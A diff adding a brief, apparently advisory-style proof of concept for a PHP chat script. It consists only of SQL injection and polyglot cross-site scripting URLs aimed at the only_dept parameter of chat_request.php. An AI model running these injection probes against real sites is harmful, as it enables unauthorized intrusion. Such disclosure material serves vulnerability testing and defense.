@@ -1,0 +1,9 @@
+SQL:
+
+http://www.example.com/support2/chat_request.php?only_dept=1%27
+
+http://www.example.com/support/chat_request.php?only_dept=1%27
+
+XSS:
+
+http://www.example.com/support2/chat_request.php?only_dept=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E
